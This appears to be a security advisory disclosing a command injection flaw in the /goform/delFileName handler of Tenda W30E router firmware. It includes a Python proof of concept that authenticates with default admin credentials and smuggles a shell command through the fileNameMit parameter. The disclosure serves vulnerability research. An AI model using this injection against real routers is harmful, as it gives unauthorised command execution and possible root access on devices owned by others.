# Tenda W30E V1.0.1.25(633) command injection vulnerability

## Firmware information

- Manufacturer's address：https://www.tenda.com.cn/

- Firmware download address ： https://www.tenda.com.cn/download/detail-2218.html


## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/W30E/exeCommand/img/1.png)

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/W30E/delFileName/2.png)

In /goform/delFileName, fileNameMit will be strtok into v5, and finally put into doSystemCmd. It is worth noting that there is not too much checking, which leads to command injection vulnerability

## Poc

```python
import requests

cmd = b'fileNameMit=;ls -al . > ./tmp/test;'

url = b"http://192.168.10.103/login/Auth"
payload = b"http://192.168.10.103/goform/delFileName/?" + cmd

data = {
    "username": "admin",
    "password": "admin",
}

def attack():
    s = requests.session()
    resp = s.post(url=url, data=data)
    print(resp.content)
    resp = s.post(url=payload, data=data)
    print(resp.content)

attack()
```

You can see that the command was executed successfully, and finally you can write exp to get the root shell
